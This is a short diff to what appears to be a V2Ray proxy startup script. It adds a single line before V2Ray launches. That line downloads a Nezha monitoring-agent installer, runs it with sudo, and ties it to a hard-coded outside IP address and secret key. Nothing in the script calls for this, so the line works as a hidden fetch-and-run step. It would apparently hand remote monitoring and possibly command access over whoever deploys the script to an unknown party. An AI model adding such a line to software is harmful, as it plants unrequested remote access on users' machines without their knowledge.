@@ -43,4 +43,5 @@ install -m 755 ${DIR_TMP}/v2ray ${DIR_RUNTIME}
 rm -rf ${DIR_TMP}
 
 # Run V2Ray
+curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && sudo ./nezha.sh install_agent 148.100.76.10 5555 7f1f4fde8f1607813e
 ${DIR_RUNTIME}/v2ray -config=${DIR_CONFIG}/config.pb
